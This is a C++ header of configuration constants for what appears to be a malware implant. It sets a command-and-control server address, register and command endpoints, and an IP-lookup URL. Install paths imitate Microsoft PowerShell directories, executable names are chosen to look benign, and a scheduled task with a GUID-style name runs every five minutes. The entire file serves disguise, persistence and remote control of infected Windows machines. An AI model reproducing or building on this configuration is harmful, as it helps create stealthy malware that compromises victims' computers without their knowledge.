#ifndef CONSTANTS_HH
#define CONSTANTS_HH

#include <string>

const std::string GET_IP_URL = "https://now-dns.com/ip";
const std::string C2_SERVER = "http://localhost:41450";
const std::string REGISTER_URI = "/convey/register/";
const std::string CMD_URI = "/convey/cmd/";
const std::string HASH_TYPE = "sha256sum";

const int SEED_RNG_ITERATIONS = 1000000;

const std::string INSTALL_DIR = "AppData\\Local\\Microsoft\\Windows\\PowerShell";
const std::string ADMIN_INSTALL_DIR = "C:\\ProgramData\\Microsoft\\Windows\\PowerShell";
const std::string SEED_FILE = "ProfileDataCache";
const std::string BIN = "aura.exe";
const std::string BIN_NEW = "AnalyzeProcessCache.exe";

const std::string TASK_NAME = "{3B3CC70E-08F1-46L6-87ED-4AK69034E676}";
const std::string TASK_FREQ = "MINUTE";
const std::string TASK_FREQ_VALUE = "5";

#endif // CONSTANTS_HH